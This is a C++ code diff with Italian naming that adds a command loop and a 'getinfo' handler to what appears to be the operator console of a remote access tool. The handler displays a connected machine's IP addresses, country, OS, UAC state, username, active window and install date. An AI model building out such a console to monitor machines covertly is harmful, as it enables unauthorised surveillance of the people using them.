@@ -52,7 +52,80 @@ void AccettaConnessioni(TcpIP& Server)
     }
 }
 
+void GetInfo(SOCKET Sock)
+{
+    json j;
+    CLInterface cli;
+    VectString Header;
+    VectString Body;
+
+    Header.push_back("INFO");
+    Header.push_back("VALORE");
+
+    j = COMUNICAZIONI::GetInfo(Sock);
+
+    Body.push_back("IP Wan");
+    Body.push_back(j["IPW"]);
+
+    Body.push_back("IP Lan");
+    Body.push_back(j["IPL"]);
+
+    Body.push_back("Nazione");
+    Body.push_back(j["NAZ"]);
+
+    Body.push_back("OS");
+    Body.push_back(j["OS"]);
+
+    Body.push_back("UAC");
+    Body.push_back(j["UAC"]);
+
+    Body.push_back("Percorso");
+    Body.push_back(j["PATH"]);
+
+    Body.push_back("Versione");
+    Body.push_back(j["VER"]);
+
+    Body.push_back("Nome PC");
+    Body.push_back(j["PCNAME"]);
+
+    Body.push_back("Nome Utente");
+    Body.push_back(j["USERNAME"]);
+
+    Body.push_back("CPU %");
+    Body.push_back(j["CPU"]);
+
+    Body.push_back("RAM %");
+    Body.push_back(j["RAM"]);
+
+    Body.push_back("Finestra Attiva");
+    Body.push_back(j["ACTWIN"]);
+
+    Body.push_back("Data Installazione");
+    Body.push_back(j["INSTDATE"]);
+
+    cout << "Informazioni ricevute:" << endl;
+    cli.Table(Header, Body);
+    
+}
+
 void Sessione(int ID, SOCKET Sock)
 {
+    CLInterface cli;
+    TextColor tc;
 
+    string cmd;
+
+    for (bool Controllo = true; Controllo;)
+    {
+        system("cls");
+        StampaTitolo(1);
+        cli.SubTitle("Sessione Comandi", 60, tc.Green);
+
+        StampaPrefix();
+        getline(cin, cmd);
+        cmd = ToLowerCase(cmd);
+
+        if (cmd.find("getinfo") != string::npos)
+            GetInfo(Sock);
+    }
 }
